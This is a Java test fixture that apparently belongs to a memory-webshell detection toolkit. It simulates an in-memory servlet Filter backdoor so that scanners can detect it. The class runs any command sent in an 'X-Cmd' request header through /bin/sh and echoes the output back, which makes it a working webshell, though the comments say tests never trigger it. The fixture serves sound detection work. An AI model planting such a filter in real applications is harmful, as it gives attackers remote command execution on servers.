package com.memsweep.testkit;

import jakarta.servlet.Filter;
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.ServletRequest;
import jakarta.servlet.ServletResponse;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.IOException;

/**
 * 模拟内存马 Filter 的行为（类本身在测试里由 MemoryClassLoader 以字节码方式定义，
 * 从而具备 CodeSource=null 的内存类特征）。
 *
 * 命令执行只在特定请求参数下触发，测试默认不会真正执行外部命令，
 * 但字节码中保留 Runtime/ProcessBuilder 引用，供字节码探针命中。
 */
public class EvilMemoryFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        String cmd = req.getHeader("X-Cmd");
        if (cmd != null) {
            // 内存马典型行为：命令执行回显。测试不发送 X-Cmd，分支不会触发。
            try {
                Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
                byte[] out = p.getInputStream().readAllBytes();
                resp.setHeader("X-Pwned", "1");
                resp.getWriter().write(new String(out));
            } catch (IOException e) {
                resp.sendError(500, e.getMessage());
            }
            return;
        }
        resp.setHeader("X-Evil-Filter", "present");
        chain.doFilter(request, response);
    }
}
